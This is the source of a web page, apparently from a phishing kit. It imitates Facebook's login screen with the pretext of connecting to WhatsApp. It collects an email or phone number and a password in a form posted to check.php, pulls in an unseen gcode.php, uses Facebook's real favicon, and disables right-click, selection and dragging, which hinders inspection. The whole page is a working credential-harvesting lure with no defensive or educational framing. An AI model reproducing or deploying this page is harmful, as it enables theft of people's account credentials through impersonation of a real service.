<?php 
include 'gcode.php'; 
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:title" content="Facebook - log in or sign up">
<meta name="description" content="Log in to your Facebook account to connect to WhatsApp.">
<meta property="og:description" content="Log in to your Facebook account to connect to WhatsApp.">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Facebook - log in or sign up">
<meta property="og:type" content="website">
<title>Facebook - log in or sign up</title>
<link rel="stylesheet" href="css/style.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<div class="navbar">
	<img src="img/fb.png">
</div>
<div class="content-box">
	<img src="img/icon.png">
	<div class="txt-login">
		 Log in to your Facebook account to connect to WhatsApp
	</div>
	<form class="login-form" action="check.php" method="post">
		<label>
		<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required></label>
		<label>
		<input type="password" name="password" placeholder="Facebook password" autocomplete="off" autocapitalize="off" required></label>
		<input type="hidden" name="login" value="Facebook" readonly>
		<button type="submit" class="btn-login">Log In</button>
	</form>
	<div class="txt-create-account">Create Account</div>
	<div class="txt-not-now">Not now</div>
	<div class="txt-forgotten-password">Forgotten password?</div>
</div>
<div class="language-box">
	<center>
	<div class="language-name language-name-active">English (UK)</div>
	<div class="language-name">Bahasa Indonesia</div>
	<div class="language-name">Basa Jawa</div>
	<div class="language-name">Bahasa Melayu</div>
	<div class="language-name">日本語</div>
	<div class="language-name">Español</div>
	<div class="language-name">Português (Brasil)</div>
	<div class="language-name">
		<i class="fa fa-plus"></i>
	</div>
	</center>
</div>
<div class="copyright">Facebook Inc.</div>
</body>
</html>